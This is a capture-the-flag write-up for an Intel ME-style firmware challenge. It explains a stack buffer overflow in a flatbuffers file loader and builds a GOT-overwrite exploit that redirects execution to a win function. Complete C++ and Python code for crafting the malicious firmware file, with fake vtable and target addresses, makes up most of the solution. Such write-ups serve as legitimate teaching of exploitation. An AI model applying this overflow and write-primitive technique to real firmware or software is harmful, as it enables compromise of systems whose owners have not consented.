# Conundrum at El Nit Patroon Rico

- legend

\* A long time ago in a galaxy far, far away.... *

Company headquarters, El Nit Patroon Rico:

[A] In order to satisfy our shareholders, we need a piece of the hardware to be invisible to the user and really hard to tamper. Any ideas?

[B] Mm. We should put another CPU onto the motherboard, load proprietary code on it and make sure the boot0 rom checks digital signatures on that.

[A] Sounds so orwellian when you say it Billy. I love it. Any way this could go wrong?

[B] Maybe. But we can put more obscurity around it, I have a few ideas. Huffman compression with unknown dictionaries burned into boot0, hardware fuses, no documentation.

[A] Fascinating, I will present it to the board of directors. El Nit Patroon Rico will be great again, thanks to you Billy.

`nc challenges.crysys.hu 5010`

_author: Sun G_

Attached files:
- [mefw.fbs](mefw.fbs)
- [me](me)

## Writeup

Looking into the `me` a bit we can see that it reads a "filesystem" from a "firmware" (packed with flatbuffers, and we are even given the fbs file), loads one file, and does nothing.

Generating a valid flatbuffers file was kinda straightforward, mostly following the tutorial, except that finalizing the buffer must be done by `me::FinishFwHeaderBuffer(builder, fs);` or the file will be invalid.

From the strings, I just get reminded of `Intel ME` or `Intel Management Engine`, a platform-control processor in intel motherboards. I've heard of this stuff, but did not know anything really.

But what I knew was, that the author actually had a talk about it: [Dávid Török - My Adventures in Disabling Intel ME 12](https://www.youtube.com/watch?v=MqR6i6qvZFc) (watch it, it's great)

That leads us to another talk of the researchers who first hacked intel ME: [How to Hack a Turned-Off Computer, or Running Unsigned Code in Intel Management Engine](https://www.youtube.com/watch?v=9fhNokIgBMU)

And guess what, the challenge just had the same vulnerability! Basically, `/home/bup/ct` gets read into a fixed-size buffer on the stack, regardless of it's real size. 

Stack canary would catch us, but the Russian researchers found a way around it. There's an object on that stack used to determine address to write, and overflew that to write into a return pointer of a sub-function, and thus redirect the execution to a ROP chain.

It turns out we can't really do the same thing, because the stack randomness is too high - but we still have similar objects determining address to write.

We have so few building blocks that the solution follows kinda naturally. The only global object we partially control is a pointer to the flatbuffer data of of the `FwHeader` entry.

What we need to overwrite a pointer on the stack is:
- pointer to a struct
- that struct's entry at `0x68` should point to another struct
- said struct's entry at `0x28` be a vector
- said vector is a struct with 2 important entries: at `0x0` a pointer to the first entry, `0x8` a pointer to the last
- each entry should be a pointer to a struct
- those structs have 3 important entries: `0x0` size to write (ignored), `0x8` pointer to destination of write, `0x10` should be 0


Well, we can just reuse the flatbuffer data 3 times:
- write pointer to `data - 0x68` to stack
- at `data+0x28` write global address of pointer, `data+0x30` write that address + 8 (set up vector)
- at `data+8`, write address we want to override
- at `data+16`, write 0

Okay, but the flatbuffer thing is complicated, and we can't just insert any data, right? Some fields of it are checked, and they are at the beginning, and also the whole thing is not long enough for that!

[Well, it turns out](https://github.com/dvidelabs/flatcc/blob/master/doc/binary-format.md), if we modify the `vtable`, we can insert any data we like into it, except in the first 4 bytes - but those are never needed! How convenient!

So, what to overwrite? I went for a classic GOT overwrite. We have a `win` function, so the target is obvious. I had to consider functions called from `win`, so I won't get infinite recursion - I've chosen `__assert_fail()` as my entrypoint, as that's easy to trigger by a wrongly-sized chunk, and with a 64 byte write I still don't write any functions used by `win`.

Generating the flatbuffers file:
```cpp
#define FLATBUFFERS_DEBUG_VERIFICATION_FAILURE
#include "mefw_generated.h"
#include <iostream>
#include <string>
#include <fstream>
#include <vector>

int main() {
    
    flatbuffers::FlatBufferBuilder builder;
    auto filename = builder.CreateString("/home/bup/ct");
    std::vector<flatbuffers::Offset<me::Chunk>> chunksvec;
    for (int i = 0; i<18; i++) {
        std::string payload(64, 'A');
        std::vector<uint8_t> chunkdata_vec;
        
        if (i==15) {
            for (int k = 0; k<16; k++) {
                chunkdata_vec.push_back(payload[i]);
            }
            /*
            chunkdata_vec.push_back(0xa0);
            chunkdata_vec.push_back(0x90);
            chunkdata_vec.push_back(0x40);
            chunkdata_vec.push_back(0);
            chunkdata_vec.push_back(0);
            chunkdata_vec.push_back(0);
            chunkdata_vec.push_back(0);
            chunkdata_vec.push_back(0);
            // 00 00 00 00 00 40 90 A0
            */
            chunkdata_vec.push_back(0x78-0x68);
            chunkdata_vec.push_back(0x91);
            chunkdata_vec.push_back(0x40);
            chunkdata_vec.push_back(0);
            chunkdata_vec.push_back(0);
            chunkdata_vec.push_back(0);
            chunkdata_vec.push_back(0);
            chunkdata_vec.push_back(0x00);
            // 00 00 00 00 00 40 91 78
            for (int k = 0; k<64-16-8; k++) {
                chunkdata_vec.push_back(payload[i]);
            }
        } else if (i==17) {
            chunkdata_vec.push_back('A');
        } else if (i==16) {
            for (int k = 0; k<8; k++) {
               chunkdata_vec.push_back(0x18);
                chunkdata_vec.push_back(0x1e);
                chunkdata_vec.push_back(0x40);
                chunkdata_vec.push_back(0);
                chunkdata_vec.push_back(0);
                chunkdata_vec.push_back(0);
                chunkdata_vec.push_back(0);
                chunkdata_vec.push_back(0x00);
                // 401E18
            }
        } else {
            for (int k = 0; k<64; k++) {
               chunkdata_vec.push_back(payload[i]+i);
            }
        }
        auto chunk = me::CreateChunkDirect(builder, &chunkdata_vec);
        chunksvec.push_back(chunk);
    }
    auto f = me::CreateFileDirect(builder, "/home/bup/ct", 18, false, &chunksvec);
    std::vector<flatbuffers::Offset<me::File>> allFilesVec;
    allFilesVec.push_back(f);
    auto filesVector = builder.CreateVector(allFilesVec);
    auto fs = me::CreateFwHeader(builder, 0x1337,0x1337,0x1337, filesVector);
    me::FinishFwHeaderBuffer(builder, fs);
    int size = builder.GetSize();
    auto pt = builder.ReleaseBufferPointer();
    std::cout<<"Generated payload buffer!"<<std::endl;
    std::ofstream wf("firmware", std::ios::out | std::ios::binary);
    if (!wf) {
        std::cout<<"Could not create file :("<<std::endl;
        return -1;
    }
    wf.write((char*)pt.data(), size);
    wf.close();
    if (!wf.good()) {
        std::cout<<"Error at write time!"<<std::endl;
        return -1;
    }
    std::cout<<"Done!"<<std::endl;

    flatbuffers::Verifier v(pt.data(), size);
    bool ok = me::VerifyFwHeaderBuffer(v);
    std::cout<<"Verification: "<<ok<<std::endl;
    return 0;
}
```

And modding it and putting in extra data:
```python
# add fake data to the root table
# namely 256 bytes

with open("firmware","rb") as fin:
    data = fin.read()

# vtable len
# table len + 0x100
# ofset1 + 0x100
# ofset2
# ofset3
# ofset4
fake_vtable =     b"\x0c\x00" + \
                  b"\x10\x01" + \
                  b"\x06\x01" + \
                  b"\x08\x01" + \
                  b"\x0a\x01" + \
                  b"\x0c\x01"

main_table = data[0x18:]

extradata = list(b"\x00"*0x100)
for i,d in enumerate([0x78,0x91,0x40]):
    extradata[0x28-4+i] = d
for i,d in enumerate([0x78+8,0x91,0x40]):
    extradata[0x28-4+8+i] = d

for i,d in enumerate([0x38,0x8c,0x40]):
    extradata[4+i] = d

extradata = bytes(extradata)



out_data = data[:8]+b"\x00"*4+fake_vtable+main_table[:4]+extradata+main_table[4:]

with open("firmware_fed","wb") as fout:
    fout.write(out_data) 
```

Also, `El Nit Patroon Rico` is an anagram for `Intel Corporation` or `Intel CIA porn root`. Idk witch one was intended...